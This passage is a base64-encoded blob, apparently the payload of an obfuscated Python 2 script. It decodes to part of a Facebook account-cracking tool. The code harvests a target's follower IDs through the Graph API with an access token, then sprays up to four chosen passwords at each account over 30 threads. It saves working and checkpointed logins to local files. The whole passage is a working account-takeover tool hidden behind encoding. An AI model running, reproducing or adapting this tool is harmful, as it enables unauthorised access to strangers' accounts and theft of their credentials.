NbMTs5Mm1bMV1QYXNzd29yZDogJykKICAgICAgICBwYXNzMiA9IHJhd19pbnB1dCgnIFwwMzNbMTs5Mm1bMl1QYXNzd29yZDogJykKICAgICAgICBwYXNzMyA9IHJhd19pbnB1dCgnIFwwMzNbMTs5Mm1bM11QYXNzd29yZDogJykKCXBhc3M0ID0gcmF3X2lucHV0KCcgXDAzM1sxOzkybVs0XVBhc3N3b3JkOiAnKQogICAgICAgIGlkdCA9IHJhd19pbnB1dCgnIFwwMzNbMTs5M21b4piFXUVudGVyIGlkOiAnKQogICAgICAgIAogICAgICAgIHRyeToKICAgICAgICAgICAgciA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJyArIGlkdCArICc/YWNjZXNzX3Rva2VuPScgKyB0b2tlbikKICAgICAgICAgICAgcSA9IGpzb24ubG9hZHMoci50ZXh0KQogICAgICAgICAgICB6ID0gcVsnbmFtZSddCiAgICAgICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgICAgICAgICBwcmludCBsb2dvCiAgICAgICAgICAgIHByaW50ICdcMDMzWzE7OTBtfn5+fiBDaG9pY2UgZm9sbG93ZXJzIGNyYWNraW5nIH5+fn4nCiAgICAgICAgICAgIHByaW50ICcgXDAzM1sxOzkybUNsb25pbmcgZnJvbTogJyArIHoKICAgICAgICBleGNlcHQgKEtleUVycm9yLCBJT0Vycm9yKToKICAgICAgICAgICAgcHJpbnQgJ1x0IEludmFsaWQgdXNlciBceDFiWzA7OTdtJwogICAgICAgICAgICByYXdfaW5wdXQoJ1wwMzNbMTs5Mm1QcmVzcyBlbnRlciB0byB0cnkgYWdhaW4gJykKICAgICAgICAgICAgYXV0b19jcmFjaygpCgogICAgICAgIHIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLycgKyBpZHQgKyAnL3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0nICsgdG9rZW4gKyAnJmxpbWl0PTk5OTk5OScpCiAgICAgICAgeiA9IGpzb24ubG9hZHMoci50ZXh0KQogICAgICAgIGZvciBpIGluIHpbJ2RhdGEnXToKICAgICAgICAgICAgdWlkID0gaVsnaWQnXQogICAgICAgICAgICBuYSA9IGlbJ25hbWUnXQogICAgICAgICAgICBubSA9IG5hLnJzcGxpdCgnICcpWzBdCiAgICAgICAgICAgIGlkLmFwcGVuZCh1aWQgKyAnfCcgKyBubSkKICAgICAgICAKICAgIGVsaWYgYV9zID09ICczJzoKICAgICAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgICAgICBwcmludCBsb2dvCiAgICAgICAgcHJpbnQgJyBcMDMzWzE7OTBtRm9yLWV4YW1wbGUgOiBcMDMzWzE7OTdtMjM0NTY3LDMzNDQ1NSw0NDU1NjYsNTU2Njc3XDAzM1sxOzk0bScKICAgICAgICBwcmludCA0NyAqICctJwogICAgICAgIHBhc3MxID0gcmF3X2lucHV0KCcgXDAzM1sxOzkybVsxXVBhc3N3b3JkOiAnKQogICAgICAgIHBhc3MyID0gcmF3X2lucHV0KCcgXDAzM1sxOzkybVsyXVBhc3N3b3JkOiAnKQogICAgICAgIHBhc3MzID0gcmF3X2lucHV0KCcgXDAzM1sxOzkybVszXVBhc3N3b3JkOiAnKQoJcGFzczQgPSByYXdfaW5wdXQoJyBcMDMzWzE7OTJtWzRdUGFzc3dvcmQ6ICcpCiAgICAgICAgdHJ5OgoJICAgIGlkbGlzdD0gcmF3X2lucHV0KCdbK10gRmlsZSBOYW1lOiAnKQoJICAgIGZvciBsaW5lIGluIG9wZW4oaWRsaXN0ICwncicpLnJlYWRsaW5lcygpOgoJICAgICAgICBpZC5hcHBlbmQobGluZS5zdHJpcCgpKQoJZXhjZXB0IElPRXJyb3I6CgkgICAgcHJpbnQiWyFdIEZpbGUgTm90IEZvdW5kLiIKCSAgICByYXdfaW5wdXQoJ1ByZXNzIEVudGVyIFRvIEJhY2suICcpCgkgICAgY3JhY2soKQogICAgCiAgICBlbGlmIGFfcyA9PSAnMCc6CiAgICAgICAgbWVudSgpCiAgICBlbHNlOgogICAgICAgIHByaW50ICcnCiAgICAgICAgcHJpbnQgJ1x0Q2hvb3NlIHZhbGlkIG9wdGlvbicgKyB3CiAgICAgICAgYV9zKCkKICAgIHByaW50ICcgVG90YWwgaWRzOiAnICsgc3RyKGxlbihpZCkpCiAgICB0aW1lLnNsZWVwKDAuNSkKICAgIHByaW50ICcgXDAzM1sxOzkybUNyYWNrIFJ1bm5pbmdcMDMzWzE7OTRtICcKICAgIHRpbWUuc2xlZXAoMC41KQogICAgcHJpbnQgNDcgKiAnLScKICAgIHByaW50ICdcdFwwMzNbMTs5Mm3ikr7ik4nik4/wn4Wn8J+Fo/Cfhajwn4Wb8J+FmPCfhaLwn4WX8J+Ev/CfhLDwn4WD8J+Et/CfhLDwn4S98J+EuFwwMzNbMTs5NG0nCiAgICBwcmludCA0NyAqICctJwogICAgCiAgICBkZWYgbWFpbihhcmcpOgogICAgICAgIHVzZXIgPSBhcmcKICAgICAgICAodWlkLCBuYW1lKSA9IHVzZXIuc3BsaXQoJ3wnKQogICAgICAgIAogICAgICAgIHRyeToKICAgICAgICAgICAgZGF0YSA9IHJlcXVlc3RzLmdldCgnaHR0cDovL2xvY2FsaG9zdDo1MDAwL2F1dGg/aWQ9JyArIHVpZCArICcmcGFzcz0nICsgcGFzczEsIGhlYWRlcnMgPSBoZWFkZXIpLnRleHQKICAgICAgICAgICAgcSA9IGpzb24ubG9hZHMoZGF0YSkKICAgICAgICAgICAgaWYgJ2xvYycgaW4gcToKICAgICAgICAgICAgICAgIHByaW50ICdcMDMzWzE7OTVtW1BBVEhBTkktT0td4p6kICcgKyB1aWQgKyAnIHwgJyArIHBhc3MxCiAgICAgICAgICAgICAgICBvayA9IG9wZW4oJy9zZGNhcmQvaWRzL0hPUF9PSy50eHQnLCAnYScpCiAgICAgICAgICAgICAgICBvay53cml0ZSh1aWQgKyAnIHwgJyArIHBhc3MxICsgJ1xuJykKICAgICAgICAgICAgICAgIG9rLmNsb3NlKCkKICAgICAgICAgICAgICAgIG9rcy5hcHBlbmQodWlkICsgcGFzczEpCiAgICAgICAgICAgIGVsaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHFbJ2Vycm9yJ106CiAgICAgICAgICAgICAgICBwcmludCAnXDAzM1sxOzk3bVtQQVRIQU5JLUNQXeKepCAnICsgdWlkICsgJyB8ICcgKyBwYXNzMQogICAgICAgICAgICAgICAgY3AgPSBvcGVuKCdIT1BfQ1AudHh0JywgJ2EnKQogICAgICAgICAgICAgICAgY3Aud3JpdGUodWlkICsgJyB8ICcgKyBwYXNzMSArICdcbicpCiAgICAgICAgICAgICAgICBjcC5jbG9zZSgpCiAgICAgICAgICAgICAgICBjcHMuYXBwZW5kKHVpZCArIHBhc3MxKQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgZGF0YSA9IHJlcXVlc3RzLmdldCgnaHR0cDovL2xvY2FsaG9zdDo1MDAwL2F1dGg/aWQ9JyArIHVpZCArICcmcGFzcz0nICsgcGFzczIsIGhlYWRlcnMgPSBoZWFkZXIpLnRleHQKICAgICAgICAgICAgICAgIHEgPSBqc29uLmxvYWRzKGRhdGEpCiAgICAgICAgICAgICAgICBpZiAnbG9jJyBpbiBxOgogICAgICAgICAgICAgICAgICAgIHByaW50ICdcMDMzWzE7OTVtW1BBVEhBTkktT0td4p6kICcgKyB1aWQgKyAnIHwgJyArIHBhc3MyCiAgICAgICAgICAgICAgICAgICAgb2sgPSBvcGVuKCcvc2RjYXJkL2lkcy9IT1BfT0sudHh0JywgJ2EnKQogICAgICAgICAgICAgICAgICAgIG9rLndyaXRlKHVpZCArICcgfCAnICsgcGFzczIgKyAnXG4nKQogICAgICAgICAgICAgICAgICAgIG9rLmNsb3NlKCkKICAgICAgICAgICAgICAgICAgICBva3MuYXBwZW5kKHVpZCArIHBhc3MyKQogICAgICAgICAgICAgICAgZWxpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gcVsnZXJyb3InXToKICAgICAgICAgICAgICAgICAgICBwcmludCAnXDAzM1sxOzk3bVtQQVRIQU5JLUNQXeKepCAnICsgdWlkICsgJyB8ICcgKyBwYXNzMgogICAgICAgICAgICAgICAgICAgIGNwID0gb3BlbignSE9QX0NQLnR4dCcsICdhJykKICAgICAgICAgICAgICAgICAgICBjcC53cml0ZSh1aWQgKyAnIHwgJyArIHBhc3MyICsgJ1xuJykKICAgICAgICAgICAgICAgICAgICBjcC5jbG9zZSgpCiAgICAgICAgICAgICAgICAgICAgY3BzLmFwcGVuZCh1aWQgKyBwYXNzMikKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgZGF0YSA9IHJlcXVlc3RzLmdldCgnaHR0cDovL2xvY2FsaG9zdDo1MDAwL2F1dGg/aWQ9JyArIHVpZCArICcmcGFzcz0nICsgcGFzczMsIGhlYWRlcnMgPSBoZWFkZXIpLnRleHQKICAgICAgICAgICAgICAgICAgICBxID0ganNvbi5sb2FkcyhkYXRhKQogICAgICAgICAgICAgICAgICAgIGlmICdsb2MnIGluIHE6CiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICdcMDMzWzE7OTVtW1BBVEhBTkktT0td4p6kICcgKyB1aWQgKyAnIHwgJyArIHBhc3MzCiAgICAgICAgICAgICAgICAgICAgICAgIG9rID0gb3BlbignL3NkY2FyZC9pZHMvSE9QX09LLnR4dCcsICdhJykKICAgICAgICAgICAgICAgICAgICAgICAgb2sud3JpdGUodWlkICsgJyB8ICcgKyBwYXNzMyArICdcbicpCiAgICAgICAgICAgICAgICAgICAgICAgIG9rLmNsb3NlKCkKICAgICAgICAgICAgICAgICAgICAgICAgb2tzLmFwcGVuZCh1aWQgKyBwYXNzMykKICAgICAgICAgICAgICAgICAgICBlbGlmICd3d3cuZmFjZWJvb2suY29tJyBpbiBxWydlcnJvciddOgogICAgICAgICAgICAgICAgICAgICAgICBwcmludCAnXDAzM1sxOzk3bVtQQVRIQU5JLUNQXeKepCAnICsgdWlkICsgJyB8ICcgKyBwYXNzMwogICAgICAgICAgICAgICAgICAgICAgICBjcCA9IG9wZW4oJ0hPUF9DUC50eHQnLCAnYScpCiAgICAgICAgICAgICAgICAgICAgICAgIGNwLndyaXRlKHVpZCArICcgfCAnICsgcGFzczMgKyAnXG4nKQogICAgICAgICAgICAgICAgICAgICAgICBjcC5jbG9zZSgpCiAgICAgICAgICAgICAgICAgICAgICAgIGNwcy5hcHBlbmQodWlkICsgcGFzczMpCiAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgZGF0YSA9IHJlcXVlc3RzLmdldCgnaHR0cDovL2xvY2FsaG9zdDo1MDAwL2F1dGg/aWQ9JyArIHVpZCArICcmcGFzcz0nICsgcGFzczQsIGhlYWRlcnMgPSBoZWFkZXIpLnRleHQKICAgICAgICAgICAgICAgICAgICAgICAgcSA9IGpzb24ubG9hZHMoZGF0YSkKICAgICAgICAgICAgICAgICAgICAgICAgaWYgJ2xvYycgaW4gcToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICdcMDMzWzE7OTVtW1BBVEhBTkktT0td4p6kICcgKyB1aWQgKyAnIHwgJyArIHBhc3M0CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBvayA9IG9wZW4oJy9zZGNhcmQvaWRzL0hPUF9PSy50eHQnLCAnYScpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBvay53cml0ZSh1aWQgKyAnIHwgJyArIHBhc3M0ICsgJ1xuJykKICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9rLmNsb3NlKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9rcy5hcHBlbmQodWlkICsgcGFzczQpCiAgICAgICAgICAgICAgICAgICAgICAgIGVsaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHFbJ2Vycm9yJ106CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCAnXDAzM1sxOzk3bVtQQVRIQU5JLUNQXeKepCAnICsgdWlkICsgJyB8ICcgKyBwYXNzNAogICAgICAgICAgICAgICAgICAgICAgICAgICAgY3AgPSBvcGVuKCdIT1BfQ1AudHh0JywgJ2EnKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY3Aud3JpdGUodWlkICsgJyB8ICcgKyBwYXNzNCArICdcbicpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjcC5jbG9zZSgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjcHMuYXBwcGVuZCh1aWQgKyBwYXNzNCkKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHBhc3MKICAgICAgICAKCgogICAgcCA9IFRocmVhZFBvb2woMzApCiAgICBwLm1hcChtYWluLCBpZCkKICAgIHByaW50IDQ3ICogJy0nCiAgICBwcmludCAnIFwwMzNbMTs5Mm0gTWF6YSBUbyBBeWEgSG9nYSAnCiAgICBwcmludCAnIFwwMzNbMTs5Mm1Ub3RhbCBcMDMzWzE7OTVtT2tcMDMzWzE7OTBtL1wwMzNbMTs5N21DcDonICsgc3RyKGxlbihva3MpKSArICcvJyArIHN0cihsZW4oY3BzKSkKICAgIHByaW50IDQ3ICogJy0nCiAgICByYXdfaW5wdXQoJyBcMDMzWzE7OTBtUHJlc3MgZW50ZXIgdG8gYmFjaycpCiAgICBhdXRvX2NyYWNrKCkKCQoKCmlmIF9fbmFtZV9fID09ICdfX21haW5fXyc6CiAgICByZWcoKQo="))
